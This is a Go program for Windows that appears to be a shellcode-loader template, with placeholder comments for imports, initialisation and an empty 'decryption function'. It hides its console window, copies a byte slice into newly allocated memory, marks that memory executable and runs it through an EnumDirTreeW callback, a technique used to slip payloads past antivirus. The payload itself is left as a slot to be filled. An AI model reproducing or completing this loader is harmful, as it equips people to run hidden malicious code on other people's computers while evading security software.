package main

import (
	"github.com/gonutz/ide/w32"
	"golang.org/x/sys/windows"
	"unsafe"
	//__import__
)

var (
	timer int
	dummy [522]byte
)



func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// 解密函数
func f() {}

func main() {
	// byteSlice
	closeWindows(w32.SW_HIDE)
	//__init__
	kernel32          := windows.NewLazyDLL("kernel32.dll")
	ntdll            := windows.NewLazyDLL("ntdll.dll")
	Dbghelp          := windows.NewLazyDLL("Dbghelp.dll")
	VirtualAlloc      := kernel32.NewProc("VirtualAlloc")
	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	SymInitialize     := Dbghelp.NewProc("SymInitialize")
	EnumDirTreeW      := Dbghelp.NewProc("EnumDirTreeW")
	RtlMoveMemory     := ntdll.NewProc("RtlMoveMemory")
	VirtualProtect    := kernel32.NewProc("VirtualProtect")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), 0x1000, 0x04)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
	oldProtect := 0x04
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(byteSlice)), 0x10, uintptr(unsafe.Pointer(&oldProtect)))
	Process, _, _ := GetCurrentProcess.Call()
	SymInitialize.Call(Process, 0, 1)
	p1, _ := windows.UTF16PtrFromString("C:\\\\Windows")
	p2, _ := windows.UTF16PtrFromString("*.log")
	EnumDirTreeW.Call(Process, (uintptr)(unsafe.Pointer(p1)), (uintptr)(unsafe.Pointer(p2)), (uintptr)(unsafe.Pointer(&dummy)), addr, 0)

}
